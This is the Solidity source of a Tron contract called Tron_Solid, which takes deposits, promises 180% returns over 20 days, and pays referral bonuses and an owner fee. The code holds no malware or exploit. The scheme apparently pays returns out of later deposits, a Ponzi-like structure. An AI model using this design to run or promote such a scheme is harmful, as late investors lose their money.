//SourceUnit: Tron_Solid.sol

pragma solidity 0.5.8;

/* ---> (www.tronsolid.com)  | (c) 2020 Developed by TRX-ON-TOP TEAM Tron_Solid.sol <------ */

contract Tron_Solid {
    struct Tarif {
        uint8 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        Tarif[] tarifs;
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40  last_payout;
        uint40  last_withdraw;
        uint40  last_reinvest;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        uint256 deposits_count;
        uint256 reinvest_count;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;
    uint40 public start_time;
    uint40 public min_to_invest;
    uint40 public minutes_withdraw;
    uint40 public minutes_reinvest;
    uint40 public minutes_to_start;

    uint256 public invested;
	uint256 public investors;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    uint256 private maintenance_fee;
    uint256 private advertising_fee;
    
    uint8[] public ref_bonuses; 
    
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        owner = msg.sender;
        start_time = uint40(block.timestamp);
        minutes_withdraw = 1440;
        minutes_reinvest = 1440;
        minutes_to_start = 90; 
        maintenance_fee = 2;
        advertising_fee = 2;
        min_to_invest = 30E6;
        
        ref_bonuses.push(5);
        ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = payoutOf(_addr);
        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }
  
    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / 100;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
             if(players[_upline].deposits.length == 0) {
                // _upline = owner;
             }
             else {
                 players[_addr].direct_bonus += _amount * 1 / 100;
                 direct_bonus += _amount * 1 / 100;
             }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 1 / 100);
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(start_time + (minutes_to_start * 60) <= block.timestamp, "Contract has not started yet");
        require(msg.value >= min_to_invest, "Minimum to invest is 30");
        
        Player storage player = players[msg.sender];
        
        if (player.deposits.length == 0) {
         player.last_withdraw = uint40(block.timestamp) - (minutes_withdraw * 60);   
         player.tarifs.push(Tarif(20, 180)); 
        }

        require(player.deposits.length < 220, "Max 220 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: 0,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        if (player.total_invested == 0) {
            investors++;
        }

        player.deposits_count++;
        player.total_invested += msg.value;
        invested += msg.value;

        _refPayout(msg.sender, msg.value);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        uint40 last_withdraw = player.last_withdraw;
        
        if (last_withdraw == 0 && player.deposits_count > 0) {
            last_withdraw = player.deposits[0].time;
        }
        
        require(last_withdraw + (minutes_withdraw * 60) <= block.timestamp, "It is not yet time to withdraw");

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.direct_bonus + player.match_bonus;
        
        payOwnerFee(amount);

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;
        
        player.tarifs[0].life_days = 20;

        msg.sender.transfer(amount);
        player.last_withdraw = uint40(block.timestamp);
        emit Withdraw(msg.sender, amount);
    }
    
    function reinvest() external {
        Player storage player = players[msg.sender];

        uint40 last_reinvest = player.last_reinvest;
        
        if (last_reinvest == 0 && player.deposits_count > 0) {
            last_reinvest = player.deposits[0].time;
        }
        
        require(last_reinvest + (minutes_reinvest * 60) <= block.timestamp, "It is not yet time to reinvest");

        _payout(msg.sender); 

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 reinvestAmount = player.dividends + player.direct_bonus + player.match_bonus;

        uint8 ld = player.tarifs[0].life_days;
        if (ld > 1) {
         player.tarifs[0].life_days = ld - 1; 
        }

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        
        player.deposits.push(Deposit({
            tarif: 0,
            amount: reinvestAmount,
            time: uint40(block.timestamp)
        }));  
        
        emit NewDeposit(msg.sender, reinvestAmount, 0);
        
        player.reinvest_count++;
        player.last_reinvest = uint40(block.timestamp);
        player.total_invested += reinvestAmount;
    }    

    function payoutOf(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = player.tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to - from) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

    function activeInvest(address _addr) external view onlyOwner returns(uint256) {
        return _activeInvest(_addr);
    }

    function activeInvest() external view returns(uint256) {
        return _activeInvest(msg.sender);
    }

    function _activeInvest(address _addr) private view returns(uint256) {
        Player storage player = players[_addr];
        uint256 value;

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = player.tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount;
            }
        }

        return value;
    }

    function payOwnerFee(uint256 val) private {
        uint256 amount_maintenance = (val * (maintenance_fee + advertising_fee)) / 100;
        owner.transfer(amount_maintenance);
    }
   
    function getInvestmentsPlayer(uint index) view external returns (uint8 tarif, uint256 amount, uint40 time) {
        Player storage player = players[msg.sender];
        
        require(player.total_invested != 0, "No investments found");

        return (
            player.deposits[index].tarif,
            player.deposits[index].amount,
            player.deposits[index].time
        );
    }
   
    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 active_invest, 
                                                           uint256 total_withdrawn, uint256 total_match_bonus, uint256 _match_bonus, 
                                                           uint256[3] memory structure, uint256 deposits_count, uint40 last_withdraw, uint40 last_reinvest) {
        Player storage player = players[_addr];

        uint256 payout = payoutOf(_addr);
    
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }

        last_withdraw = player.last_withdraw;
        
        last_reinvest = player.last_reinvest;
        
        if (last_reinvest == 0 && player.deposits_count > 0) {
            last_reinvest = player.deposits[0].time;
        }        

        return (
            payout + player.dividends + player.direct_bonus + player.match_bonus,
            player.total_invested,
            _activeInvest(_addr),
            player.total_withdrawn,
            player.total_match_bonus,
            player.match_bonus,
            structure, player.deposits_count,
            last_withdraw,
            last_reinvest
        );
    }
    
    function userReinvestInfo(address _addr) view external returns(uint256 _reinvest_count, uint8 _life_days, uint256 _percent) {
        Player storage player = players[_addr];
        return (
            player.reinvest_count * 1E6,
            player.tarifs[0].life_days,
            player.tarifs[0].percent
        );
    }   
    
    function for_withdraw() view external returns (uint256) {
        
        address _addr = msg.sender;
        
        Player storage player = players[_addr];
        uint256 payout = payoutOf(_addr);

        return payout + player.dividends + player.direct_bonus + player.match_bonus;
    }
    
    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus, uint256 _investors, uint40 _start_time) {
        return (invested, withdrawn, match_bonus, investors, start_time);
    }

    modifier onlyOwner {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }
}